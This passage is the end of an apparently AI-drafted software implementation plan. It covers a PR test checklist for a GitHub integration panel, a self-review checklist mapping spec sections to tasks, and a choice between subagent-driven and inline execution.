- [ ] Add + remove + rename PAT profiles
- [ ] Panel populates for nubbymong/claude-command-center
- [ ] Session Context shows primary issue from branch
- [ ] CI section shows workflow runs, failed-run re-run works
- [ ] Reviews section renders sanitized comments (test malicious input)
- [ ] Rate-limit shield pauses under 10% remaining
- [ ] Cache corruption → backup retained, fresh start
- [ ] Expiry banner on mock-clocked token

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)"
```

Returns the PR URL. Share with user so Copilot review runs.

---

## Self-Review Checklist

The plan author should verify before handoff:

1. **Spec coverage:** every section in the spec maps to at least one task. Notably:
   - Section 2 (auth tiers) → Phases C, D, E
   - Section 3 (data model) → Tasks A1, A2, B2, B3
   - Section 4 (config page) → Phase J
   - Section 5 (per-session) → Phase K
   - Section 6 (panel UI + sections) → Phase L
   - Section 7 (rate-limit strategy) → Tasks F1–F5, M1
   - Section 8 (onboarding + expiry) → Phase N, Task O2
   - Section 9 (feature matrix) → embedded in capability mapper (B1) + feature toggles (J3)
   - Section 10 (security) → A5, A6, A7, I2, O4
   - Section 11 (deferred) → noted as skipped
   - Section 12 (verification) → Phase P

2. **Placeholder scan:** no "TBD", "implement later", or "similar to Task N" references without code. The Tasks J2–J7 and L2–L9 summaries are intentional scope-compressions — the engineer expands each following the pattern shown in J1/L1. If this is too compressed, expand those tasks inline.

3. **Type consistency:** `AuthProfile.capabilities` is `Capability[]`; `RepoCache.pr` is `PRSnapshot`; `SessionGitHubIntegration.repoSlug` is `string` — verify no task uses a renamed version.

---

## Execution Handoff

**Two execution options:**

1. **Subagent-Driven (recommended)** — dispatch a fresh subagent per task, review between tasks. Best for a large plan like this so each task ships clean.

2. **Inline Execution** — execute tasks in this session. Fine for smaller plans, harder to keep clean over 50+ commits.

**Which approach?**
